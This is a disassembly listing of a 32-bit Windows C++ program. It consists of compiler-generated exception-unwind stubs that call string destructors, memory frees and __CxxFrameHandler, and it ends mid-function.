jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430f3c
lea ecx [ ebp - 0x10050 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430f48
mov eax r--data
jmp __CxxFrameHandler
sub_430f60
mov eax [ ebp + 0x4 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_408de0
add esp 0x8
retn
sub_430f71
mov eax r--data
jmp __CxxFrameHandler
sub_430f80
mov ecx [ ebp - 0x10 ]
jmp sub_413a50
sub_430f88
mov eax r--data
jmp __CxxFrameHandler
sub_430fa0
mov ecx [ ebp - 0x10 ]
jmp sub_413a50
sub_430fa8
mov eax r--data
jmp __CxxFrameHandler
sub_430fc0
mov eax [ ebp - 0x1c ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_430fcb
mov eax r--data
jmp __CxxFrameHandler
sub_430fe0
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_430feb
mov eax r--data
jmp __CxxFrameHandler
sub_431000
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431009
lea ecx [ ebp - 0x34 ]
jmp sub_403f10
sub_431011
mov eax r--data
jmp __CxxFrameHandler
sub_431020
mov ecx [ ebp - 0x10 ]
jmp sub_4130a0
sub_431028
mov eax r--data
jmp __CxxFrameHandler
sub_431040
mov ecx [ ebp - 0x10 ]
jmp sub_413110
sub_431048
mov eax r--data
jmp __CxxFrameHandler
sub_431060
mov ecx [ ebp - 0x10 ]
jmp sub_413190
sub_431068
mov eax r--data
jmp __CxxFrameHandler
sub_431080
lea ecx [ ebp - 0x164 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_43108c
lea ecx [ ebp - 0x12c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431098
lea ecx [ ebp - 0x110 ]
jmp sub_401d80
sub_4310a3
lea ecx [ ebp - 0x148 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4310af
mov eax r--data
jmp __CxxFrameHandler
sub_4310c0
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_4310cb
mov eax r--data
jmp __CxxFrameHandler
sub_4310e0
mov ecx [ ebp - 0x10 ]
jmp sub_406630
sub_4310e8
mov eax r--data
jmp __CxxFrameHandler
sub_431100
mov ecx [ ebp - 0x10 ]
jmp sub_406630
sub_431108
mov eax r--data
jmp __CxxFrameHandler
sub_431120
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_414d80
sub_43112b
mov eax r--data
jmp __CxxFrameHandler
sub_431140
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_414d80
sub_43114b
mov eax r--data
jmp __CxxFrameHandler
sub_431160
lea ecx [ ebp + 0x8 ]
jmp sub_406360
sub_431168
mov eax r--data
jmp __CxxFrameHandler
sub_431180
lea ecx [ ebp - 0x10 ]
jmp sub_415100
sub_431188
lea ecx [ ebp - 0x10 ]
jmp sub_415110
sub_431190
lea ecx [ ebp - 0x10 ]
jmp sub_415100
sub_431198
lea ecx [ ebp - 0x10 ]
jmp sub_415100
sub_4311a0
lea ecx [ ebp - 0x10 ]
jmp sub_415100
sub_4311a8
mov eax r--data
jmp __CxxFrameHandler
sub_4311c0
mov ecx [ ebp - 0x10 ]
jmp sub_415100
sub_4311c8
mov eax r--data
jmp __CxxFrameHandler
sub_4311e0
lea ecx [ ebp - 0x88 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4311ec
lea ecx [ ebp - 0x6c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4311f5
lea ecx [ ebp - 0x88 ]
jmp sub_413690
sub_431200
lea ecx [ ebp - 0x88 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_43120c
lea ecx [ ebp - 0x6c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431215
lea ecx [ ebp - 0xa4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431221
lea ecx [ ebp - 0x4c ]
jmp sub_4136e0
sub_431229
lea ecx [ ebp - 0x4c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431232
lea ecx [ ebp - 0x30 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_43123b
mov eax r--data
jmp __CxxFrameHandler
sub_431250
lea ecx [ ebp - 0x14 ]
jmp sub_406630
sub_431258
lea ecx [ ebp - 0x14 ]
jmp sub_414b80
sub_431260
mov eax r--data
jmp __CxxFrameHandler
sub_431270
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_414d80
sub_43127b
mov eax r--data
jmp __CxxFrameHandler
sub_431290
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_415780
sub_43129b
mov eax r--data
jmp __CxxFrameHandler
sub_4312b0
mov ecx [ ebp - 0x10 ]
jmp sub_414d80
sub_4312b8
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4312c4
mov ecx [ ebp - 0x10 ]
add ecx 0x3c
jmp sub_415870
sub_4312cf
mov ecx [ ebp - 0x10 ]
add ecx 0x48
jmp sub_415870
sub_4312da
mov ecx [ ebp - 0x10 ]
add ecx 0x68
jmp sub_408660
sub_4312e5
mov ecx [ ebp - 0x10 ]
add ecx 0xb8
jmp sub_4086b0
sub_4312f3
mov ecx [ ebp - 0x10 ]
add ecx 0x134
jmp sub_40dcf0
sub_431301
mov ecx [ ebp - 0x10 ]
add ecx 0x25c
jmp sub_417050
sub_43130f
mov eax r--data
jmp __CxxFrameHandler
sub_431320
mov ecx [ ebp - 0x10 ]
jmp sub_414d80
sub_431328
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431334
mov ecx [ ebp - 0x10 ]
add ecx 0x3c
jmp sub_415870
sub_43133f
mov ecx [ ebp - 0x10 ]
add ecx 0x48
jmp sub_415870
sub_43134a
mov ecx [ ebp - 0x10 ]
add ecx 0x68
jmp sub_408660
sub_431355
mov ecx [ ebp - 0x10 ]
add ecx 0xb8
jmp sub_4086b0
sub_431363
mov ecx [ ebp - 0x10 ]
add ecx 0x134
jmp sub_40dcf0
sub_431371
mov ecx [ ebp - 0x10 ]
add ecx 0x25c
jmp sub_417050
sub_43137f
mov eax r--data
jmp __CxxFrameHandler
sub_431390
mov eax r--data
jmp __CxxFrameHandler
sub_4313a0
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_408de0
add esp 0x8
retn
sub_4313b1
mov eax r--data
jmp __CxxFrameHandler
sub_4313c0
mov eax r--data
jmp __CxxFrameHandler
sub_4313d0
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4313d9
mov eax r--data
jmp __CxxFrameHandler
sub_4313f0
lea ecx [ ebp - 0x40 ]
jmp sub_414c10
sub_4313f8
mov eax r--data
jmp __CxxFrameHandler
sub_431410
lea ecx [ ebp - 0x24 ]
jmp sub_40eab0
sub_431418
lea ecx [ ebp - 0x18 ]
jmp sub_415780
sub_431420
mov eax r--data
jmp __CxxFrameHandler
sub_431430
mov eax [ ebp - 0x18 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_43143b
mov ecx [ ebp - 0x18 ]
jmp sub_413020
sub_431443
lea ecx [ ebp - 0x14 ]
jmp sub_414c10
sub_43144b
mov eax [ ebp - 0x18 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_431456
mov eax r--data
jmp __CxxFrameHandler
sub_431460
lea ecx [ ebp - 0x48c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_43146c
lea ecx [ ebp - 0x4a8 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431478
lea ecx [ ebp - 0x4a8 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431484
lea ecx [ ebp - 0x470 ]
jmp sub_415980
sub_43148f
mov eax r--data
jmp __CxxFrameHandler
sub_4314a0
lea ecx [ ebp - 0x44 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4314a9
lea ecx [ ebp - 0x60 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4314b2
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4314bb
mov eax r--data
jmp __CxxFrameHandler
sub_4314d0
mov ecx [ ebp - 0x10 ]
jmp sub_409960
sub_4314d8
mov eax r--data
jmp __CxxFrameHandler
sub_4314f0
mov ecx [ ebp - 0x10 ]
jmp sub_409960
sub_4314f8
mov eax r--data
jmp __CxxFrameHandler
sub_431510
mov ecx [ ebp - 0x10 ]
jmp sub_416bc0
sub_431518
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431524
mov eax r--data
jmp __CxxFrameHandler
sub_431530
mov ecx [ ebp - 0x10 ]
jmp sub_416bc0
sub_431538
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431544
mov eax r--data
jmp __CxxFrameHandler
sub_431550
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_43155b
mov eax r--data
jmp __CxxFrameHandler
sub_431570
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_43157b
mov eax r--data
jmp __CxxFrameHandler
sub_431590
lea ecx [ ebp - 0x14 ]
jmp sub_416ec0
sub_431598
mov eax r--data
jmp __CxxFrameHandler
sub_4315b0
mov ecx [ ebp - 0x10 ]
jmp sub_418460
sub_4315b8
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_408660
sub_4315c3
mov eax r--data
jmp __CxxFrameHandler
sub_4315d0
mov ecx [ ebp - 0x10 ]
jmp sub_418460
sub_4315d8
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_408660
sub_4315e3
mov eax r--data
jmp __CxxFrameHandler
sub_4315f0
mov eax [ ebp - 0x94 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_4315fe
lea ecx [ ebp - 0x64 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431607
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431610
lea ecx [ ebp - 0x48 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431619
mov eax r--data
jmp __CxxFrameHandler
sub_431630
mov ecx [ ebp - 0x10 ]
jmp sub_416b10
sub_431638
mov ecx [ ebp - 0x10 ]
add ecx 0x124
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431647
mov ecx [ ebp - 0x10 ]
add ecx 0x144
jmp sub_419690
sub_431655
mov eax r--data
jmp __CxxFrameHandler
sub_431660
mov ecx [ ebp - 0x10 ]
jmp sub_416b10
sub_431668
mov ecx [ ebp - 0x10 ]
add ecx 0x124
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431677
mov ecx [ ebp - 0x10 ]
add ecx 0x144
jmp sub_419690
sub_431685
mov eax r--data
jmp __CxxFrameHandler
sub_431690
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431699
mov eax r--data
jmp __CxxFrameHandler
sub_4316b0
lea ecx [ ebp - 0x64 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4316b9
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4316c2
lea ecx [ ebp + 0xc ]
jmp sub_412b40
sub_4316ca
lea ecx [ ebp - 0x64 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4316d3
lea ecx [ ebp - 0x48 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4316dc
mov eax r--data
jmp __CxxFrameHandler
sub_4316f0
lea ecx [ ebp - 0x2c ]
jmp sub_412a10
sub_4316f8
lea ecx [ ebp - 0x2c ]
jmp sub_412b40
sub_431700
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431709
lea ecx [ ebp - 0x2c ]
jmp sub_412a10
sub_431711
mov eax r--data
jmp __CxxFrameHandler
sub_431720
mov ecx [ ebp - 0x10 ]
jmp sub_412a10
sub_431728
mov eax r--data
jmp __CxxFrameHandler
sub_431740
lea ecx [ ebp - 0x48 ]
jmp sub_412a10
sub_431748
lea ecx [ ebp - 0x48 ]
jmp sub_412b40
sub_431750
lea ecx [ ebp - 0x44 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431759
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431762
lea ecx [ ebp - 0x4c ]
jmp sub_412b40
sub_43176a
lea ecx [ ebp - 0x4c ]
jmp sub_412a10
sub_431772
lea ecx [ ebp - 0x48 ]
jmp sub_412a10
sub_43177a
mov eax r--data
jmp __CxxFrameHandler
sub_431790
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_4183d0
sub_43179b
mov eax r--data
jmp __CxxFrameHandler
sub_4317b0
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_4183d0
sub_4317bb
mov eax r--data
jmp __CxxFrameHandler
sub_4317d0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_4317de
mov eax r--data
jmp __CxxFrameHandler
sub_4317f0
lea ecx [ ebp - 0x90 ]
jmp sub_401db0
sub_4317fb
mov eax r--data
jmp __CxxFrameHandler
sub_431810
lea ecx [ ebp - 0x90 ]
jmp sub_401db0
sub_43181b
lea ecx [ ebp - 0x114 ]
jmp sub_401db0
sub_431826
mov eax r--data
jmp __CxxFrameHandler
sub_431830
lea ecx [ ebp - 0x90 ]
jmp sub_401db0
sub_43183b
lea ecx [ ebp - 0x114 ]
jmp sub_401db0
sub_431846
mov eax r--data
jmp __CxxFrameHandler
sub_431850
mov ecx [ ebp - 0x10 ]
jmp sub_409830
sub_431858
mov eax r--data
jmp __CxxFrameHandler
sub_431870
mov ecx [ ebp - 0x10 ]
jmp sub_409830
sub_431878
mov ecx [ ebp - 0x10 ]
jmp sub_408fe0
sub_431880
mov eax r--data
jmp __CxxFrameHandler
sub_431890
mov ecx [ ebp - 0x10 ]
jmp sub_4190b0
sub_431898
mov ecx [ ebp - 0x10 ]
jmp sub_409830
sub_4318a0
mov ecx [ ebp - 0x10 ]
jmp sub_408fe0
sub_4318a8
mov eax r--data
jmp __CxxFrameHandler
sub_4318c0
mov ecx [ ebp - 0x10 ]
jmp sub_409830
sub_4318c8
mov ecx [ ebp - 0x10 ]
jmp sub_4190b0
sub_4318d0
mov eax r--data
jmp __CxxFrameHandler
sub_4318e0
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp sub_4195d0
sub_4318eb
mov ecx [ ebp - 0x10 ]
add ecx 0x40
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4318f7
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431903
mov eax r--data
jmp __CxxFrameHandler
sub_431910
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp sub_4195d0
sub_43191b
mov ecx [ ebp - 0x10 ]
add ecx 0x40
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431927
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_431933
mov eax r--data
jmp __CxxFrameHandler
sub_431940
lea ecx [ ebp - 0x10 ]
jmp sub_406390
sub_431948
lea ecx [ ebp - 0x10 ]
jmp sub_4063b0
sub_431950
lea ecx [ ebp - 0x10 ]
jmp sub_406390
sub_431958
lea ecx [ ebp - 0x10 ]
jmp sub_406390
sub_431960
mov eax r--data
jmp __CxxFrameHandler
sub_431970
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_43197b
mov eax r--data
jmp __CxxFrameHandler
sub_431990
lea ecx [ ebp - 0x1c ]
jmp sub_40a6f0
sub_431998
mov eax r--data
jmp __CxxFrameHandler
sub_4319b0
lea ecx [ ebp - 0x20 ]
jmp sub_406d90
sub_4319b8
lea ecx [ ebp + 0x8 ]
jmp sub_406d90
sub_4319c0
mov eax [ ebp - 0x24 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x24 ] 0xfffffffe
lea ecx [ ebp - 0x10 ]
jmp sub_406d90
sub_4319d9
mov eax [ ebp - 0x24 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x24 ] 0xfffffffd
lea ecx [ ebp - 0x14 ]
jmp sub_406d90
sub_4319f2
mov eax [ ebp - 0x24 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x24 ] 0xfffffffb
lea ecx [ ebp - 0x18 ]
jmp sub_406d90
sub_431a0b
mov eax [ ebp - 0x24 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x24 ] 0xfffffff7
lea ecx [ ebp - 0x1c ]
jmp sub_406d90
sub_431a24
mov eax r--data
jmp __CxxFrameHandler
sub_431a30
lea ecx [ ebp - 0x48 ]
jmp sub_40a6f0
sub_431a38
lea ecx [ ebp - 0x58 ]
jmp sub_406d90
sub_431a40
lea ecx [ ebp - 0x58 ]
jmp sub_406d90
sub_431a48
lea ecx [ ebp - 0x50 ]
jmp sub_406d90
sub_431a50
lea ecx [ ebp - 0x4c ]
jmp sub_406d90
sub_431a58
mov eax r--data
jmp __CxxFrameHandler
sub_431a70
lea ecx [ ebp - 0x3c ]
jmp sub_407620
sub_431a78
mov eax r--data
jmp __CxxFrameHandler
sub_431a90
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431a99
lea ecx [ ebp - 0x34 ]
jmp sub_403f10
sub_431aa1
mov eax r--data
jmp __CxxFrameHandler
sub_431ab0
mov eax [ ebp + 0x4 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_408de0
add esp 0x8
retn
sub_431ac1
mov eax r--data
jmp __CxxFrameHandler
sub_431ad0
mov eax r--data
jmp __CxxFrameHandler
sub_431ae0
mov eax r--data
jmp __CxxFrameHandler
sub_431af0
mov eax r--data
jmp __CxxFrameHandler
sub_431b00
lea ecx [ ebp - 0x10 ]
jmp sub_41a780
sub_431b08
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431b22
mov eax r--data
jmp __CxxFrameHandler
sub_431b30
lea ecx [ ebp - 0x10 ]
jmp sub_41a780
sub_431b38
mov eax r--data
jmp __CxxFrameHandler
sub_431b50
mov eax r--data
jmp __CxxFrameHandler
sub_431b60
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431b69
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp j_sub_41b5e0
sub_431b74
mov eax r--data
jmp __CxxFrameHandler
sub_431b80
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431b89
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp j_sub_41b5e0
sub_431b94
mov eax r--data
jmp __CxxFrameHandler
sub_431ba0
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431ba9
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp j_sub_41b5e0
sub_431bb4
mov eax r--data
jmp __CxxFrameHandler
sub_431bc0
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_41b760
sub_431bcb
mov eax r--data
jmp __CxxFrameHandler
sub_431be0
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_41b760
sub_431beb
mov eax r--data
jmp __CxxFrameHandler
sub_431c00
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_408de0
add esp 0x8
retn
sub_431c11
mov eax r--data
jmp __CxxFrameHandler
sub_431c20
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431c29
mov eax r--data
jmp __CxxFrameHandler
sub_431c40
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431c49
mov ecx [ ebp - 0x58 ]
add ecx 0xc
jmp sub_41b760
sub_431c54
mov ecx [ ebp - 0x54 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431c5d
mov ecx [ ebp - 0x54 ]
add ecx 0x1c
jmp j_sub_41b5e0
sub_431c68
mov eax r--data
jmp __CxxFrameHandler
sub_431c80
lea ecx [ ebp - 0x48 ]
jmp j_sub_41b5e0
sub_431c88
lea ecx [ ebp - 0x38 ]
jmp sub_41b760
sub_431c90
mov eax r--data
jmp __CxxFrameHandler
sub_431ca0
lea ecx [ ebp - 0x10 ]
jmp sub_41a780
sub_431ca8
mov eax r--data
jmp __CxxFrameHandler
sub_431cc0
lea ecx [ ebp + 0x8 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431cc9
lea ecx [ ebp - 0x10 ]
jmp sub_41a780
sub_431cd1
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp j_sub_41b5e0
sub_431cea
mov eax r--data
jmp __CxxFrameHandler
sub_431d00
mov ecx [ ebp - 0x10 ]
jmp sub_41c620
sub_431d08
mov eax r--data
jmp __CxxFrameHandler
sub_431d20
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_41c650
sub_431d2b
mov eax r--data
jmp __CxxFrameHandler
sub_431d40
mov ecx [ ebp - 0x10 ]
jmp sub_41c620
sub_431d48
mov eax r--data
jmp __CxxFrameHandler
sub_431d60
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_41c650
sub_431d6b
mov eax r--data
jmp __CxxFrameHandler
sub_431d80
lea ecx [ ebp - 0x14 ]
jmp sub_41a780
sub_431d88
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_431d93
mov eax r--data
jmp __CxxFrameHandler
sub_431da0
mov eax r--data
jmp __CxxFrameHandler
sub_431db0
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_415780
sub_431dbb
mov eax r--data
jmp __CxxFrameHandler
sub_431dd0
lea ecx [ ebp - 0x18 ]
jmp sub_40eab0
sub_431dd8
mov eax r--data
jmp __CxxFrameHandler
sub_431df0
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_431df9
mov ecx [ ebp - 0x54 ]
add ecx 0xc
jmp sub_415780
sub_431e04
mov eax r--data
jmp __CxxFrameHandler
sub_431e10
lea ecx [ ebp - 0x10 ]
jmp sub_40eab0
sub_431e18
mov eax r--data
jmp __CxxFrameHandler
sub_431e30
mov ecx [ ebp - 0x10 ]
